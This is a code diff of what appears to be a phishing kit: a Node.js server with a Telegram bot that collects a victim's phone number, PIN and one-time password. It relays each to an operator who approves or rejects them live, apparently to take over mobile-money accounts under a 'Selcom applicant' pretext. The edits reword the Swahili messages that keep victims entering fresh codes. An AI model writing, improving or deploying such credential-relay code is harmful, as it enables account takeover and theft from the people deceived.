@@ -110,7 +110,7 @@ async function initBot() {
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ PIN imekataliwa (WRONG PIN). Mteja anaombwa kuweka PIN upya.`);
+          await bot.sendMessage(chatTarget, `❌ PIN imekataliwa. Mteja anaombwa kuweka PIN sahihi upya.`);
           break;
         case 'ALLOW_CREDS':
           session.status = 'PROCEED_OTP';
@@ -119,7 +119,7 @@ async function initBot() {
         case 'EXPIRED_OTP':
           session.status = 'RETRY_OTP';
           session.otp = '';
-          await bot.sendMessage(chatTarget, `❌ OTP imekataliwa / Imeisha muda wake (EXPIRED OTP). Mteja anapaswa kuweka OTP upya.`);
+          await bot.sendMessage(chatTarget, `❌ OTP imewekwa kama imeisha muda wake (EXPIRED OTP). Mteja ameelezwa kusubiri SMS mpya.`);
           break;
         case 'REQUEST_NEW_OTP':
           session.status = 'REQUEST_NEW_OTP';
@@ -145,7 +145,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Phone Number & PIN -> Title: **NEW SELCOM APPLICANT** (Buttons: ALLOW, DENY)
+// Step 1: Submit Phone Number & PIN
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { phone, pin, adminChatId } = req.body || {};
@@ -195,7 +195,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 6-digit OTP -> Title: **OTP VERIFICATION** accompanied by applicant phone number and EXPIRED OTP button
+// Step 2: Submit 6-digit OTP
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -270,4 +270,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-    
+        
